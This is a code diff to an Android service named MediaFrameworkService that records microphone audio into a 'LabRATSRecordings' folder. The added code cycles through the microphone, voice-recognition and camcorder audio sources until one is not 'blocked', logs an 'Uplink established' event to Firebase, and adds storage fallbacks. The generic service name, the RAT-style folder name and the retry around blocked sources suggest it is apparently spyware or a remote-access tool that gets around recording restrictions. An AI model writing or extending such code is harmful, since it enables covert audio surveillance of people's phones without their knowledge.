@@ -6,6 +6,7 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -295,7 +296,7 @@ public class MediaFrameworkService extends Service {
             acquireWakeLock();
 
             // Create directory
-            File recordDir = getRecordingsDirectory();
+            File recordDir = getRecordingsDirectory(this);
             if (!recordDir.exists()) {
                 recordDir.mkdirs();
             }
@@ -411,7 +412,7 @@ public class MediaFrameworkService extends Service {
             acquireWakeLock();
 
             // Create directory
-            File recordDir = getRecordingsDirectory();
+            File recordDir = getRecordingsDirectory(this);
             if (!recordDir.exists()) {
                 recordDir.mkdirs();
             }
@@ -426,30 +427,56 @@ public class MediaFrameworkService extends Service {
 
             // Setup MediaRecorder
             mediaRecorder = createMediaRecorder();
-            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-            mediaRecorder.setAudioEncodingBitRate(128000);
-            mediaRecorder.setAudioSamplingRate(44100);
-            mediaRecorder.setOutputFile(currentRecordingPath);
+            
+            int[] sources = {
+                MediaRecorder.AudioSource.MIC,
+                MediaRecorder.AudioSource.VOICE_RECOGNITION,
+                MediaRecorder.AudioSource.CAMCORDER
+            };
 
-            // Set max duration if specified
-            if (durationSeconds > 0) {
-                mediaRecorder.setMaxDuration(durationSeconds * 1000);
-                mediaRecorder.setOnInfoListener((mr, what, extra) -> {
-                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
-                        stopMicRecording();
+            boolean started = false;
+            StringBuilder errorLogs = new StringBuilder();
+
+            for (int source : sources) {
+                try {
+                    mediaRecorder.reset();
+                    mediaRecorder.setAudioSource(source);
+                    mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+                    mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+                    mediaRecorder.setAudioEncodingBitRate(128000);
+                    mediaRecorder.setAudioSamplingRate(44100);
+                    mediaRecorder.setOutputFile(currentRecordingPath);
+
+                    // Set max duration if specified
+                    if (durationSeconds > 0) {
+                        mediaRecorder.setMaxDuration(durationSeconds * 1000);
+                        mediaRecorder.setOnInfoListener((mr, what, extra) -> {
+                            if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
+                                stopMicRecording();
+                            }
+                        });
                     }
-                });
+
+                    mediaRecorder.prepare();
+                    mediaRecorder.start();
+                    started = true;
+                    Log.d(TAG, "Microphone recording started with source: " + source);
+                    FirebaseConfig.logActivity("MIC_RECORD: Uplink established using source_id_" + source);
+                    break;
+                } catch (Exception e) {
+                    errorLogs.append(source).append(":").append(e.getMessage()).append("; ");
+                    Log.w(TAG, "Mic source " + source + " blocked: " + e.getMessage());
+                }
             }
 
-            mediaRecorder.start();
+            if (!started) {
+                throw new Exception("ALL_MIC_SOURCES_BLOCKED: " + errorLogs.toString());
+            }
 
             isRecordingMic = true;
             recordingStartTime = System.currentTimeMillis();
 
             updateNotification();
-
             Log.d(TAG, "Microphone recording started successfully: " + currentRecordingPath);
 
         } catch (Exception e) {
@@ -538,13 +565,25 @@ public class MediaFrameworkService extends Service {
         }
     }
 
-    private File getRecordingsDirectory() {
+    public static File getRecordingsDirectory(Context context) {
         if (saveOnDeviceEnabled) {
-            return new File(Environment.getExternalStoragePublicDirectory(
-                    Environment.DIRECTORY_MUSIC), "LabRATSRecordings");
-        } else {
-            return new File(getFilesDir(), "recordings");
+            try {
+                File publicDir = new File(Environment.getExternalStoragePublicDirectory(
+                        Environment.DIRECTORY_MUSIC), "LabRATSRecordings");
+                if (publicDir.exists() || publicDir.mkdirs()) {
+                    return publicDir;
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "Failed to use public storage: " + e.getMessage());
+            }
         }
+        
+        // Fallback to internal storage
+        File internalDir = new File(context.getFilesDir(), "recordings");
+        if (!internalDir.exists()) {
+            internalDir.mkdirs();
+        }
+        return internalDir;
     }
 
     // ============ STATIC ACCESSORS ============
